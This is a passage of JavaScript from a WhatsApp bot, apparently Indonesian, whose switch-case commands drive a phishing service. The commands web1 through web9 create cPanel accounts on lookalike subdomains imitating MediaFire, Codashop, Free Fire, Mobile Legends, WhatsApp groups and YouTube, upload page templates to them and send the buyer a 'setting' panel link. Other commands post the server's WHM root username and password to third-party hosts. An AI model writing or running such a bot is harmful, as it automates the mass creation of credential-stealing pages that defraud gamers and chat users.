                let buttonMessage = {
                    text: anu.data,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
case 'createakun':
               id = mek.key.remoteJid
        if(validGrup(id,grups)){
let user =
            args[0]
              ?.split("|")[0]
              ?.split(".")[0]
              ?.trim()
              ?.replace(/[^a-z0-9]/gi, "")
              ?.toLowerCase() || "user" + Math.random().toString().substring(2, 7);
          let pass = args.join(" ")?.split("|")?.[1]?.trim() || "@@server##";
          let pkg = args.join(" ")?.split("|")?.[2]?.trim() || "cPanel Unlimited";

host = server[0].url
    uroot = server[0].username
    proot = server[0].password
domain = user +".login"
var inputt = {
    
                  server: host,
              uroot: uroot,
              proot: proot,
                 user: user,
              pass: pass,
              domain: domain,
              pkg: pkg,
          }

          request.post({
              url: 'https://randiramli.com/api/hosting/create.php',
              form: inputt
            }, function(error, response, body){
    m.reply(body)
    })
}else{
	m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
        break

case 'ceksmtp':
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
    var inputt = {
        
        server: host,
        uroot: uroot,
              proot: proot,
          }
          
          request.post({
              url: 'https://yogax.my.id/smtp.php',
              form: inputt
            }, function(error, response, body){
m.reply(body)
})
        break
case 'addip':
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
    var inputt = {
        
        server: host,
        uroot: uroot,
              proot: proot,
          }
          
          request.post({
              url: 'https://kamukontol.com/1.0/remove_package.php',
              form: inputt
            }, function(error, response, body){
m.reply(body)
})
        break
case 'termintdefault' :
m.reply("Waittt....")
if (!isCreator && !mek.key.fromMe) return m.reply('Only Owner')
host = server[0].url
uroot = server[0].username
proot = server[0].password
var inputt = {
     
server: host,
uroot: uroot,
proot: proot,
}
 
request.post({
url: 'https://randiramli.com/api/hosting/termintdefault.php',
form: inputt
}, function(error, response, body){
m.reply(body)
})
break
case 'cekdefault':
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
 var inputt = {
     
              server: host,
              uroot: uroot,
              proot: proot,
            }
          request.post({
              url: 'https://randiramli.com/api/hosting/cekdefault.php',
              form: inputt
            }, function(error, response, body){
m.reply(body)
})
        break
        case 'termint':
            if (!isCreator && !mek.key.fromMe) return m.reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            if (!isAdmin && !mek.key.fromMe) return m.reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            user = args[0]
            host = server[0].url
            uroot = server[0].username
proot = server[0].password
var inputt = {
    
              server: host,
              uroot: uroot,
              proot: proot,
              user: user,
            }
            
          request.post({
              url: 'https://randiramli.com/api/hosting/termint.php',
              form: inputt
            }, function(error, response, body){
                m.reply(body)
            })
            
            break
            case 'addpack' :
                if(args != ""){
                parse = dn.split(" | ")
                    user = parse[0]
                    pkg = parse[1]
 host = server[0].url
 uroot = server[0].username
 proot = server[0].password
 var inputt = {

     server: host,
              uroot: uroot,
              proot: proot,
              user: user,
              pkg: pkg,
          }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/addpack.php',
              form: inputt
            }, function(error, response, body){
m.reply(body)
})
}else{
    m.reply("Contoh : .addpack Meixgan | Package")
}
        break
case 'web1' :
                  id = mek.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/mediafire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("_Berhasil ✓ Data Segera di kirim chat pribadi lu , makasih_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("_Berhasil ✓ Data Segera di kirim chat pribadi lu , makasih_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 WEB SETTING 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ NOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_*")
    }
break

case 'web2' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafiree" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire2",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/mediafire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 WEB SETTING 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
	m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break
case 'owner': case 'creator': {
                MEYBotz.sendContact(m.chat, senderNumber, m)
            }
            break
case 'web3' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "simontok",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 WEB SETTING 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
        }
break
case 'web4' :

id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobilelegends-event" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/mlbb/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break

case 'web5' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "join-whatsapp" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/grubwa/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa1",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/grubwa/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 WEB SETTING 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break
case 'web6' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "chat-whatsapps" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/grubwav1/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa2",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/grubwav1/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break

case 'web7' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashop" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "coda",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break

case 'web8' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "youtube" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/youtube/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "youtube",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/youtube/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
    }else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break

case 'web9' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire-event" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/spin/spin/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "freefire",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/spin/spin/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break
case 'aloktzy' :
id = mek.key.remoteJid
        if(validGrup(id,grups)){

